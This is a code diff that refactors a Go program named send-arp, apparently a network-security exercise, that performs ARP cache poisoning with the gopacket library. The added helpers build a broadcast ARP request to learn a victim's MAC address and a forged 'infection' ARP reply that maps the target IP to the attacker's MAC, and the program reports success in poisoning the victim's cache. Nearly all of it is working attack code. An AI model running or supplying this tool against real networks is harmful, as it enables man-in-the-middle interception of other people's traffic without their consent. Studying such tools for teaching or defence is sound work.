@@ -43,6 +43,58 @@ func getAttackerMAC(intf string) net.HardwareAddr {
 	}
 }
 
+func buildNormalARPRequest(index int) []byte {
+	ethLayer := &layers.Ethernet{
+		SrcMAC:       attackerMAC,
+		DstMAC:       layers.EthernetBroadcast,
+		EthernetType: layers.EthernetTypeARP,
+	}
+	arpLayer := &layers.ARP{
+		AddrType:          layers.LinkTypeEthernet,
+		Protocol:          layers.EthernetTypeIPv4,
+		HwAddressSize:     6,
+		ProtAddressSize:   4,
+		Operation:         layers.ARPRequest,
+		SourceHwAddress:   attackerMAC,
+		SourceProtAddress: attackerIP,
+		DstHwAddress:      net.HardwareAddr{0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+		DstProtAddress:    senderIPs[index],
+	}
+	buf := gopacket.NewSerializeBuffer()
+	opts := gopacket.SerializeOptions{}
+	gopacket.SerializeLayers(buf, opts,
+		ethLayer,
+		arpLayer,
+	)
+	return buf.Bytes()
+}
+
+func buildInfectionARPReply(index int) []byte {
+	ethLayer := &layers.Ethernet{
+		SrcMAC:       attackerMAC,
+		DstMAC:       senderMAC,
+		EthernetType: layers.EthernetTypeARP,
+	}
+	arpLayer := &layers.ARP{
+		AddrType:          layers.LinkTypeEthernet,
+		Protocol:          layers.EthernetTypeIPv4,
+		HwAddressSize:     6,
+		ProtAddressSize:   4,
+		Operation:         layers.ARPReply,
+		SourceHwAddress:   attackerMAC,
+		SourceProtAddress: targetIPs[index],
+		DstHwAddress:      senderMAC,
+		DstProtAddress:    senderIPs[index],
+	}
+	buf := gopacket.NewSerializeBuffer()
+	opts := gopacket.SerializeOptions{}
+	gopacket.SerializeLayers(buf, opts,
+		ethLayer,
+		arpLayer,
+	)
+	return buf.Bytes()
+}
+
 func main() {
 	if len(os.Args) < 4 {
 		fmt.Printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n")
@@ -80,30 +132,8 @@ func main() {
 		panic(err)
 	} else {
 		for i := range len(senderIPs) {
-			/** Get senderMAC */
-			ethernetLayer1 := &layers.Ethernet{
-				SrcMAC:       attackerMAC,
-				DstMAC:       layers.EthernetBroadcast,
-				EthernetType: layers.EthernetTypeARP,
-			}
-			arpLayer1 := &layers.ARP{
-				AddrType:          layers.LinkTypeEthernet,
-				Protocol:          layers.EthernetTypeIPv4,
-				HwAddressSize:     6,
-				ProtAddressSize:   4,
-				Operation:         layers.ARPRequest,
-				SourceHwAddress:   attackerMAC,
-				SourceProtAddress: attackerIP,
-				DstHwAddress:      net.HardwareAddr{0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-				DstProtAddress:    senderIPs[i],
-			}
-			buf1 := gopacket.NewSerializeBuffer()
-			opts1 := gopacket.SerializeOptions{}
-			gopacket.SerializeLayers(buf1, opts1,
-				ethernetLayer1,
-				arpLayer1,
-			)
-			if err = handle.WritePacketData(buf1.Bytes()); err != nil {
+			normalARPRequest := buildNormalARPRequest(i)
+			if err = handle.WritePacketData(normalARPRequest); err != nil {
 				panic("Error sending packet to network device")
 			} else {
 				packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
@@ -120,34 +150,12 @@ func main() {
 			fmt.Printf("[+] Successfully got MAC address of %s\n", senderIPs[i])
 			fmt.Printf("senderMAC: %s\n", senderMAC) // !debug
 
-			/** Send Infection packet to poison ARP table */
-			ethernetLayer2 := &layers.Ethernet{
-				SrcMAC:       attackerMAC,
-				DstMAC:       senderMAC,
-				EthernetType: layers.EthernetTypeARP,
-			}
-			arpLayer2 := &layers.ARP{
-				AddrType:          layers.LinkTypeEthernet,
-				Protocol:          layers.EthernetTypeIPv4,
-				HwAddressSize:     6,
-				ProtAddressSize:   4,
-				Operation:         layers.ARPReply,
-				SourceHwAddress:   attackerMAC,
-				SourceProtAddress: targetIPs[i],
-				DstHwAddress:      senderMAC,
-				DstProtAddress:    senderIPs[i],
-			}
-			buf2 := gopacket.NewSerializeBuffer()
-			opts2 := gopacket.SerializeOptions{}
-			gopacket.SerializeLayers(buf2, opts2,
-				ethernetLayer2,
-				arpLayer2,
-			)
-			if err = handle.WritePacketData(buf2.Bytes()); err != nil {
+			infectionARPReply := buildInfectionARPReply(i)
+			if err = handle.WritePacketData(infectionARPReply); err != nil {
 				panic("Error sending packet to network device")
+			} else {
+				fmt.Printf("[+] Successfully poisoned ARP cache of %s\n", senderIPs[i])
 			}
-			fmt.Printf("[+] Successfully poisoned ARP cache of %s\n", senderIPs[i])
-
 		}
 	}
 }
